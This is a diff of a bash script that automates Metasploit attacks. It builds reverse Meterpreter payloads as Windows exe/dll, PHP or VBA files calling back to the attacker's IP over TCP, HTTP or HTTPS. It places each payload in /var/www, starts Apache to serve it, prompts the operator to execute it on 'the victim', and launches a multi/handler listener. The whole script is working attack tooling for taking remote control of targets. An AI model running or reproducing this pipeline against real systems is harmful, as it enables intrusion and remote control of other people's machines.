@@ -2,80 +2,151 @@
 #Script to generate reverse payload and launch multihandler from metasploit
 #Usage ./script port
 #by n0b1dy
-if [ $# -ne 5 ]; then
-echo "[*]Usage: $0 <port> <e(X)e|(P)hp|(D)ll> <filename> <eth{1}|{tap0}> <(H)http|(S)https | (T) Default tcp>"
-exit
-fi
-start=`date`
+
+RED="\e[0;31m"
+GREEN="\e[0;32m"
+YELLOW="\e[0;33m"
+BLUE="\e[0;34m"
+PURPLE="\e[0;35m"
+HPURPLE="\e[1;35m"
+IRED="\e[0;91m"
+IGREEN="\e[0;92m"
+IYELLOW="\e[0;93m"
+IBLUE="\e[0;94m"
+GREEN="\e[1;32m"
+BRED="\e[1;31m"
+BLUE="\e[1;34m"
+BGREEN="\e[1;32m"
+BOLD="\e[1m"
+RESET="\e[0m"
 
 
-echo "[*]---------------------------------[*]"
+msg()     { echo -e "${BOLD}[*]${RESET} ${@}"; }
+msgline() { echo -e "${BOLD}[*] `perl -e 'print "-"x50'`${RESET}"; }
+msgbox()  { msgline; echo -e "${BOLD}[*]${RESET} ${@}"; msgline; }
+
+usage() { echo -e "${BOLD}${BBLUE}\t[*] ${@}${RESET}"; }
+
+success() { echo -e "${BOLD}${BGREEN}[SUCCESS]${RESET} ${@}"; }
+error()   { echo -e "${BOLD}${BRED}[ERROR]${RESET} ${@}"; }
+info()     { echo -e "${BOLD}${BLUE}[INFO]${RESET} ${@}"; }
+
+MSFPAY=`which msfpayload`
+MSFCLI=`which msfcli`
+MSFVENOM=`which msfvenom`
+
+attacker="" # interface ip
+
 port=$1
 type=$2
 filename=$3
 interface=$4
-reverse=$5
-stage="reverse_tcp"
+stage=$5
 
-if [ $reverse == 'H' ]; then
-echo "[!]Reverse HTTP Payload Selected"
-stage="reverse_http"
+
+
+# gets interface ip
+
+getip()
+{
+#calculates target ip by default interface
+attacker=`ifconfig $1 | grep "inet " | cut -d: -f2 | cut -d" " -f1`
+}
+
+if [ $# -ne 5 ]; then
+usage "Script to generate reverse metasploit payloads and launch listener."
+usage "$0 <port> <e(X)e|(P)hp|(D)ll|(V)BA > <filename> <eth1|tap0> <(H)ttp|Http(S)|(T)cp>"
+exit
 fi
 
-if [ $reverse == 'S' ]; then
-echo "[!]Reverse HTTPS Payload Selected"
-stage="reverse_https"
-fi
 
-echo "[+]Reverse Payload Generator.[$start]"
+
+
+
+generate_payload ()
+{
+start=`date` #start counting time
+msgline;
+getip $interface;#get listenting ip interface
+extension=""
+format=""
+
+info "[${BOLD}${GREEN}$attacker${RESET}]--|--[${BOLD}${YELLOW}$port${RESET}]${BOLD}${YELLOW}$filename.${BOLD}${RED}victim${RESET}.$extension"
+info "Reverse Payload Generator.[$start]"
 #saves current directory
 dir=`echo $PWD`
-#calculates target ip by default interface
-attacker=`ifconfig $4 | grep "inet " | cut -d: -f2 | cut -d" " -f1`
-echo "[+]$attacker[=]--|--[$port]$filename.victim[=]"
-MSFPAY=`which msfpayload`
-MSFCLI=`which msfcli`
-if [ $type == 'P' ]; then
-echo "[+]Wait till we are Generating the [$filename].php"
-$MSFPAY php/meterpreter/$stage LHOST=$attacker LPORT=$port R > $dir/$filename.php.txt
-echo "[+]Transfer the $filename.php.txt to /var/www for delivery and starting webserver"
-mv $filename.php.txt /var/www
-/etc/init.d/apache2 start
-echo "[+]Launching multihandler"
-$MSFCLI multi/handler PAYLOAD=php/meterpreter/$stage LHOST=$attacker LPORT=$port E
-end=`date`
-clear
-echo "[*]Reverse Phun Generator.[$end]"
-exit
-fi
-if [ $type == 'X' ]; then
-#PrependMigrate=TRUE in order to migrate immediately to a new process
-echo "[+]Wait till we are Generating the [$filename].exe"
-$MSFPAY windows/meterpreter/$stage LHOST=$attacker LPORT=$port AutoLoginScript="migrate -f" X > $dir/$filename.exe
-#  windows/x64/
-echo "[+]Transfer the $filename.exe to /var/www for delivery and starting web server"
-mv $filename.exe /var/www
-/etc/init.d/apache2 start
-echo "[+]Launching multihandler"
-$MSFCLI multi/handler PAYLOAD=windows/meterpreter/$stage LHOST=$attacker LPORT=$port E
-end=`date`
-clear
-echo "[*]Reverse Phun Generator.[$end]"
-exit
-fi
 
-if [ $type == 'D' ]; then
 
-echo "[+]Wait till we are Generating the [$filename].dll"
-$MSFPAY windows/meterpreter/$stage LHOST=$attacker LPORT=$port D > $dir/$filename.dll
-echo "[+]Transfer the $filename.exe to /var/www for delivery and starting web server"
-mv $filename.dll /var/www
-/etc/init.d/apache2 start
-echo "[+]Launching multihandler"
-$MSFCLI multi/handler PAYLOAD=windows/meterpreter/$stage LHOST=$attacker LPORT=$port E
-end=`date`
-clear
-echo "[*]Reverse Phun Generator.[$end]"
-exit
-fi
+case $type in
+ 
+ 'X')
+ type_payload="windows"
+ extension="exe"
+ format="X"
+ ;;
+ 
+ 'D')
+ type_payload="windows"
+ extension="dll"
+  format="D"
+ ;;
+ 
+ 'P')
+ type_payload="php"
+ extension="php.txt"
+  format="R"
+ ;;
+ 
+ 'P')
+ type_payload="windows"
+ extension="vba"
+ format="V"
+ ;;
+ 
+ 
+esac 
+
+
+case $stage in
+ 
+ 'H')
+ success "Reverse HTTP Payload Selected"
+ stage="reverse_http"
+ ;;
+ 
+ 'S')
+ success "Reverse HTTPS Payload Selected"
+ stage="reverse_https"
+ ;;
+ 
+ 'T')
+ success "Reverse TCP Payload Selected"
+ stage="reverse_tcp"
+ ;;
+ 
+esac 
+
+
+  info "Wait till we are Generating the [${BOLD}${YELLOW}filename.$extension${RESET}]"
+  #echo "$MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension"
+  $MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension
+
+  info "Transfer the [${BOLD}${YELLOW}filename.$extension${RESET}] to /var/www for delivery and starting webserver"
+  mv $filename.$extension /var/www
+  /etc/init.d/apache2 start
+  success "Apache server started"
+  info "Execute the [${BOLD}${YELLOW}filename.$extension${RESET}] to the victim"
+  info "Launching multihandler"
+  $MSFCLI multi/handler PAYLOAD=$type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port E
+
+
+  end=`date`
+ clear
+success "Reverse Phun Generator.[$end]"
+
+}
+
+generate_payload;
+
+
 
